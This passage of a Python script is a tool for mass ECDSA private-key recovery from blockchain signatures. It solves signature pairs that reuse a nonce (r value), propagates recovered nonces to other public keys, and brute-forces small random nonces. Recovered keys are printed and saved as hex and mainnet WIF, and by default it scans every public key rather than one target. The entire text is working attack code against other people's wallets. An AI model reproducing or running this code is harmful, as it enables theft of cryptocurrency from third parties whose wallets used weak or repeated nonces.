    return ((s * (k % N) - z) * inv(r_val)) % N

# ---------- loaders / groupers ----------

def load_rlist(path: str) -> Set[int]:
    rset: Set[int] = set()
    if not path or not os.path.exists(path): return rset
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if not s: continue
            try: rset.add(hexint(s))
            except Exception: pass
    return rset

def load_preload_k(path: str) -> Dict[int, Set[int]]:
    """
    JSONL format:
      {"r":"...","k_candidates":["...","..."]}
    """
    out: Dict[int, Set[int]] = defaultdict(set)
    if not path or not os.path.exists(path): return out
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try: j = json.loads(line)
            except Exception: continue
            try:
                r_val = hexint(j.get("r",""))
                for khex in j.get("k_candidates",[]):
                    out[r_val].add(hexint(khex))
            except Exception:
                continue
    return out

def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = None, verbose: bool=False) -> List[Dict[str, Any]]:
    """
    Accepts JSONL (one object per line) OR a JSON array file.
    Requires z. Uses r/s if present; else tries to parse from signature_hex.
    """
    rows: List[Dict[str, Any]] = []
    tpub = normalize_pub(target_pub) if target_pub else ""
    rfilter = rfilter or set()

    if not os.path.exists(path):
        print(f"[error] signatures file not found: {path}")
        return rows

    with open(path, "r", encoding="utf-8") as f:
        data = f.read().strip()
        if data.startswith('"') and data.endswith('"') and "\n" not in data:
            data = data[1:-1]
        first = next((c for c in data if not c.isspace()), "")

        def push_obj(j: Dict[str, Any]):
            pub = normalize_pub(j.get("pubkey_hex") or j.get("pub") or j.get("pubkey") or "")
            if not pub: return
            if tpub and pub != tpub: return
            if "z" not in j: return
            try: z = hexint(j["z"])
            except Exception: return

            # r/s or parse from DER
            r_val = None; s_val = None
            if "r" in j and "s" in j:
                try:
                    r_val = hexint(j["r"]); s_val = hexint(j["s"])
                except Exception:
                    r_val = s_val = None
            if (r_val is None or s_val is None) and j.get("signature_hex"):
                try:
                    r_parsed, s_parsed, _ = parse_der_sig_plus_type(j["signature_hex"])
                    r_val, s_val = r_parsed, s_parsed
                except Exception:
                    pass
            if r_val is None or s_val is None: return
            if not (1 <= r_val < N and 1 <= s_val < N): return
            if rfilter and (r_val not in rfilter): return

            try: vin = int(j.get("vin", 0))
            except Exception: vin = 0

            rows.append({
                "txid": j.get("txid",""),
                "vin": vin,
                "r": r_val, "s": s_val, "z": z,
                "pub": pub
            })

        if first == "[":
            try:
                arr = json.loads(data)
                if isinstance(arr, list):
                    for j in arr:
                        if isinstance(j, dict): push_obj(j)
            except Exception as e:
                print(f"[error] failed to parse JSON array from {path}: {e}")
        else:
            for line in data.splitlines():
                line = line.strip()
                if not line: continue
                if line.startswith('"') and line.endswith('"'):
                    line = line[1:-1]
                try:
                    j = json.loads(line)
                except Exception:
                    continue
                if isinstance(j, dict): push_obj(j)

    if verbose:
        print(f"[info] loaded {len(rows)} usable signatures from {path}"
              + (f" (filtered by {len(rfilter)} r-values)" if rfilter else ""))
    return rows

def groups_by_r_pub(rows: List[Dict[str, Any]]):
    g = defaultdict(list)  # (r, pub) -> list of rows
    for rec in rows: g[(rec["r"], rec["pub"])].append(rec)
    return g

def by_r(rows: List[Dict[str, Any]]):
    m = defaultdict(list)  # r -> list of rows (possibly many pubs)
    for rec in rows: m[rec["r"]].append(rec)
    return m

def collisions_by_r(rows: List[Dict[str, Any]]):
    per_r = defaultdict(lambda: defaultdict(list))  # r -> pub -> rows
    for rec in rows: per_r[rec["r"]][rec["pub"]].append(rec)
    return per_r

# ---------- core math steps ----------

def recover_from_pair(r: int, a: Dict[str, Any], b: Dict[str, Any]):
    s1, s2, z1, z2 = a["s"], b["s"], a["z"], b["z"]
    cands = []
    # Path 1: s1 - s2
    denom = (s1 - s2) % N
    if denom != 0:
        k = ((z1 - z2) * inv(denom)) % N
        d = ((s1 * k - z1) * inv(r)) % N
        if 1 <= d < N and k != 0: cands.append((d, k, "diff"))
    # Path 2: s1 + s2 (handles s ↔ N-s malleation)
    denom2 = (s1 + s2) % N
    if denom2 != 0:
        k2 = ((z1 + z2) * inv(denom2)) % N
        d2 = ((s1 * k2 - z1) * inv(r)) % N
        if 1 <= d2 < N and k2 != 0: cands.append((d2, k2, "sum"))
    return cands

def add_k_candidate(r: int, k: int, store: Dict[int, Set[int]]):
    if k and 0 < k < N:
        store.setdefault(r, set()).add(k)
        store[r].add((N - k) % N)  # include complement for sign flip

# ---------- random-k helpers ----------

def _unique_rand_ks(count: int, max_excl: int, skip: set, seed: int) -> List[int]:
    rng = random.Random(seed if seed else random.SystemRandom().randint(1, 2**63-1))
    out, seen, tries, cap = [], set(), 0, count * 4
    upper = max(2, min(max_excl, N))  # upper bound exclusive-ish
    while len(out) < count and tries < cap:
        tries += 1
        k = rng.randrange(1, upper)
        if k in seen or k in skip: continue
        seen.add(k)
        out.append(k)
    return out

def random_k_scan_over_buckets(rmap,
                               recovered_priv_by_pub,
                               recovered_k_by_r,
                               seen_privs: Set[int],
                               rows_all: List[Dict[str, Any]],
                               threads: int,
                               k_per_bucket: int,
                               top_buckets: int,
                               k_range: int,
                               rand_seed: int,
                               verbose: bool) -> int:
    """
    Try random k candidates per r-bucket, in parallel across buckets.
    Returns number of newly recovered keys.
    """
    buckets = sorted(rmap.items(), key=lambda kv: len(kv[1]), reverse=True)
    if top_buckets and top_buckets > 0:
        buckets = buckets[:top_buckets]
    if not buckets or k_per_bucket <= 0:
        return 0

    lock = threading.Lock()
    new_keys_count = 0
    known_k_per_r = {r: set(kset) for r, kset in recovered_k_by_r.items()}

    def work_bucket(idx_r, bucket):
        nonlocal new_keys_count
        r_val, sigs = bucket
        k_skip = known_k_per_r.get(r_val, set())
        ks = _unique_rand_ks(k_per_bucket, k_range, k_skip, (rand_seed or 0) ^ r_val)
        if verbose:
            print(f"[random-k r={r_val:064x}] try {len(ks)} candidates over {len(sigs)} sig(s)")
        local_new = 0

        for k in ks:
            with lock:
                add_k_candidate(r_val, k, recovered_k_by_r)
                known_k_per_r.setdefault(r_val, set()).add(k)

            for sig in sigs:
                pub = sig["pub"]
                if pub in recovered_priv_by_pub:
                    continue
                try:
                    d = _derive_d_from_k_sig(r_val, sig["s"], sig["z"], k)
                    if d == 0 or d in seen_privs: continue
                    if not ecdsa_ok(sig["s"], sig["z"], r_val, d, k): continue
                    if not _pub_matches(d, pub): continue
                except Exception:
                    continue

                wif = to_wif(d, compressed=True, mainnet=True)
                rec = {
                    "pubkey": pub,
                    "priv_hex": f"{d:064x}",
                    "wif": wif,
                    "r": f"{r_val:064x}",
                    "proof": [{"txid": sig["txid"], "vin": sig["vin"]}],
                    "method": "random-k"
                }
                with lock:
                    if d not in seen_privs:
                        seen_privs.add(d)
                        recovered_priv_by_pub[pub] = d
                        new_keys_count += 1
                        local_new += 1
                        print("="*62)
                        print(f"[RECOVERED via random-k] pub={pub}")
                        print(f"  d (hex): {d:064x}")
                        print(f"  WIF   : {wif}")
                        print(f"  via   : {sig['txid']}:{sig['vin']}  (r={r_val:064x})")
                        print("="*62)
        return local_new

    workers = max(1, int(threads))
    if workers == 1:
        for i, b in enumerate(buckets):
            work_bucket(i, b)
    else:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work_bucket, i, b) for i, b in enumerate(buckets)]
            for fu in as_completed(futs):
                _ = fu.result()

    return new_keys_count

# ---------- main ----------

def main():
    ap = argparse.ArgumentParser(description="Stronger ECDSA recovery with propagation and random-k scanning")
    ap.add_argument("--sigs", default="signatures.jsonl", help="path to signatures.jsonl OR signatures.json")
    ap.add_argument("--rlist", default="", help="optional path to r_values.txt (one hex r per line)")
    ap.add_argument("--out-json", default="recovered_keys.jsonl", help="output JSONL with recoveries")
    ap.add_argument("--out-txt",  default="recovered_keys.txt", help="output TXT with human-readable recoveries")
    ap.add_argument("--out-k",   default="recovered_k.jsonl", help="output JSONL with recovered k per r")
    ap.add_argument("--pub", default="", help="optional pubkey filter (33/65-byte hex) — omit to scan ALL")
    ap.add_argument("--min-count", type=int, default=2, help="minimum signatures per (pub,r) cluster for primary recovery")
    ap.add_argument("--max-iter", type=int, default=4, help="maximum propagation iterations after primary phase")
    ap.add_argument("--testnet", action="store_true", help="emit testnet WIF (else mainnet)")
    ap.add_argument("--report-collisions", default="", help="write cross-pub r-collisions to this JSONL (info)")
    ap.add_argument("--export-clusters",  default="", help="write dupR_clusters.jsonl for (pub,r) clusters (>=2)")
    ap.add_argument("-v", "--verbose", action="store_true", help="verbose logging")
    # random-k & threading
    ap.add_argument("--threads", type=int, default=1, help="worker threads for random-k scan")
    ap.add_argument("--scan-random-k", type=int, default=0, help="if >0, try this many random k per hot r-bucket")
    ap.add_argument("--scan-random-k-top", type=int, default=50, help="number of hottest r-buckets to scan (0=all)")
    ap.add_argument("--scan-random-k-range", type=int, default=(1<<32), help="draw k in [1..range] (capped by n)")
    ap.add_argument("--rand-seed", type=int, default=0, help="seed for random k (0=system entropy)")
    ap.add_argument("--preload-k", default="", help="preload recovered_k.jsonl to seed r->k candidates")
    args = ap.parse_args()

    rset = load_rlist(args.rlist)
    rows = load_signatures_any(args.sigs, target_pub=args.pub, rfilter=rset, verbose=args.verbose)
    if not rows:
        print("No usable signatures found. Need z and either (r,s) or signature_hex + pubkey_hex.")
        sys.exit(1)

    # Optional reports/exports
    if args.report_collisions:
        per_r = collisions_by_r(rows)
        out = 0
        with open(args.report_collisions, "w", encoding="utf-8") as f:
            for r_val, pubs in per_r.items():
                if len(pubs) <= 1: continue
                obj = {
                    "r": f"{r_val:064x}",
                    "pubs": {pub: [{"txid": x["txid"], "vin": x["vin"]} for x in lst] for pub, lst in pubs.items()},
                    "distinct_pubs": len(pubs),
                    "total_sightings": sum(len(lst) for lst in pubs.values())
                }
                f.write(json.dumps(obj) + "\n")
                out += 1
        if args.verbose:
            print(f"[info] wrote {out} cross-pub r-collision records to {args.report_collisions}")

    if args.export_clusters:
        groups = groups_by_r_pub(rows)
        cnt = 0
        with open(args.export_clusters, "w", encoding="utf-8") as f:
            for (r_val, pub), lst in groups.items():
                if len(lst) < args.min_count: continue
                obj = {
                    "r": f"{r_val:064x}",
                    "pubkey": pub,
                    "count": len(lst),
                    "sightings": [{"txid": x["txid"], "vin": x["vin"]} for x in lst]
                }
                f.write(json.dumps(obj) + "\n")
                cnt += 1
        if args.verbose:
            print(f"[info] wrote {cnt} clusters to {args.export_clusters}")

    groups = groups_by_r_pub(rows)           # (r, pub) -> list
    rmap   = by_r(rows)                      # r -> list (all pubs/signatures)
    sigs_by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for rec in rows: sigs_by_pub[rec["pub"]].append(rec)

    recovered: List[Dict[str, Any]] = []
    seen_privs: Set[int] = set()
    recovered_priv_by_pub: Dict[str, int] = {}                 # pub -> d
    recovered_k_by_r: Dict[int, Set[int]] = load_preload_k(args.preload_k)  # r -> {k}

    # Phase A: Primary recovery per-(pub,r) with >=2 sigs — also collect k
    for (r_val, pub), lst in groups.items():
        if len(lst) < args.min_count:
            if args.verbose:
                print(f"[-] singleton skipped (pub={pub[:16]}…, r={r_val:064x}, count={len(lst)})")
            continue

        if args.verbose:
            print(f"[cluster pub={pub[:16]}… r={r_val:064x}] count={len(lst)}")

        for a, b in combinations(lst, 2):
            for d, k, why in recover_from_pair(r_val, a, b):
                if not (ecdsa_ok(a["s"], a["z"], r_val, d, k) and ecdsa_ok(b["s"], b["z"], r_val, d, k)):
                    continue
                try:
                    pk_c, pk_u = derive_pub_hex(d)
                except Exception:
                    continue
                if pub not in (pk_c, pk_u):
                    continue

                if d not in seen_privs:
                    seen_privs.add(d)
                    recovered_priv_by_pub[pub] = d
                    wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                    rec = {
                        "pubkey": pub,
                        "priv_hex": f"{d:064x}",
                        "wif": wif,
                        "r": f"{r_val:064x}",
                        "proof": [
                            {"txid": a["txid"], "vin": a["vin"]},
                            {"txid": b["txid"], "vin": b["vin"]}
                        ],
                        "method": f"primary-{why}"
                    }
                    recovered.append(rec)
                    print("="*62)
                    print(f"[RECOVERED] pub={pub}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {a['txid']}:{a['vin']}  &  {b['txid']}:{b['vin']}  ({why})")
                    print("="*62)

                # seed k-candidates (both k and N-k)
                add_k_candidate(r_val, k, recovered_k_by_r)
                # recompute k from each sig given d (consistency)
                try:
                    k_a = ((a["z"] + (r_val * d) % N) % N) * inv(a["s"]) % N
                    add_k_candidate(r_val, k_a, recovered_k_by_r)
                    k_b = ((b["z"] + (r_val * d) % N) % N) * inv(b["s"]) % N
                    add_k_candidate(r_val, k_b, recovered_k_by_r)
                except Exception:
                    pass

    # OPTIONAL: Random-k scan on hottest r-buckets (before propagation loop)
    if args.scan_random_k and args.scan_random_k > 0:
        if args.verbose:
            print(f"[random-k] threads={args.threads}, per-bucket={args.scan_random_k}, top={args.scan_random_k_top}, range={args.scan_random_k_range}, seed={args.rand_seed}")
        new_from_random = random_k_scan_over_buckets(
            rmap=rmap,
            recovered_priv_by_pub=recovered_priv_by_pub,
            recovered_k_by_r=recovered_k_by_r,
            seen_privs=seen_privs,
            rows_all=rows,
            threads=args.threads,
            k_per_bucket=int(args.scan_random_k),
            top_buckets=int(args.scan_random_k_top),
            k_range=int(args.scan_random_k_range),
            rand_seed=int(args.rand_seed),
            verbose=args.verbose
        )
        if args.verbose:
            print(f"[random-k] new keys: {new_from_random}")

    # Helpers for iterative propagation
    def expand_k_from_privs() -> int:
        added = 0
        for pub, d in list(recovered_priv_by_pub.items()):
            for sig in sigs_by_pub.get(pub, []):
                r_val = sig["r"]
                try:
                    k = ((sig["z"] + (r_val * d) % N) % N) * inv(sig["s"]) % N
                except Exception:
                    continue
                before = len(recovered_k_by_r[r_val])
                add_k_candidate(r_val, k, recovered_k_by_r)
                after = len(recovered_k_by_r[r_val])
                added += (after - before)
        return added

    def propagate_with_known_k() -> int:
        new_count = 0
        for r_val, kset in list(recovered_k_by_r.items()):
            if not kset: continue
            if args.verbose:
                print(f"[propagate r={r_val:064x}] trying {len(kset)} k-candidate(s) over {len(rmap.get(r_val, []))} signature(s)")
            for sig in rmap.get(r_val, []):
                pub = sig["pub"]
                if pub in recovered_priv_by_pub:
                    continue
                for k in list(kset):
                    try:
                        d = ((sig["s"] * k - sig["z"]) * inv(r_val)) % N
                        if not (1 <= d < N): continue
                        if not ecdsa_ok(sig["s"], sig["z"], r_val, d, k): continue
                        pk_c, pk_u = derive_pub_hex(d)
                        if pub not in (pk_c, pk_u): continue
                    except Exception:
                        continue
                    if d in seen_privs: continue
                    seen_privs.add(d)
                    recovered_priv_by_pub[pub] = d
                    wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                    rec = {
                        "pubkey": pub,
                        "priv_hex": f"{d:064x}",
                        "wif": wif,
                        "r": f"{r_val:064x}",
                        "proof": [{"txid": sig["txid"], "vin": sig["vin"]}],
                        "method": "propagate-from-r"
                    }
                    recovered.append(rec)
                    print("="*62)
                    print(f"[RECOVERED via propagation] pub={pub}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {sig['txid']}:{sig['vin']}  (r={r_val:064x})")
                    print("="*62)
                    new_count += 1
        return new_count

    # Phase B: Iterative expansion & propagation until fixed point or max-iter
    iter_no = 0
    while iter_no < args.max_iter:
        iter_no += 1
        grew_k = expand_k_from_privs()
        grew_keys = propagate_with_known_k()
        if args.verbose:
            print(f"[iter {iter_no}] grew_k={grew_k}, grew_keys={grew_keys}")
        if grew_k == 0 and grew_keys == 0:
            break

    # Outputs
    if not recovered:
        print("Tried primary clusters, random-k, and propagation; no valid recovery.")
        sys.exit(0)

    with open(args.out_json, "w", encoding="utf-8") as f:
        for rec in recovered:
            f.write(json.dumps(rec) + "\n")
    with open(args.out_txt, "w", encoding="utf-8") as f:
        for rec in recovered:
            if rec["method"].startswith("primary"):
                via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']} & {rec['proof'][1]['txid']}:{rec['proof'][1]['vin']}"
            else:
                via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']}"
            f.write(f"PUB={rec['pubkey']} PRIV={rec['priv_hex']} WIF={rec['wif']} "
                    f"R={rec['r']} via {via} ({rec['method']})\n")

    with open(args.out_k, "w", encoding="utf-8") as f:
        for r_val, kset in recovered_k_by_r.items():
            if not kset: continue
            f.write(json.dumps({
                "r": f"{r_val:064x}",
                "k_candidates": [f"{k:064x}" for k in sorted(kset)]
            }) + "\n")

    print(f"\nSaved {len(recovered)} recovery record(s) to:")
    print(f"  {args.out_json}")
    print(f"  {args.out_txt}")
    print(f"Saved recovered k candidates per r to: {args.out_k}")

if __name__ == "__main__":
    main()
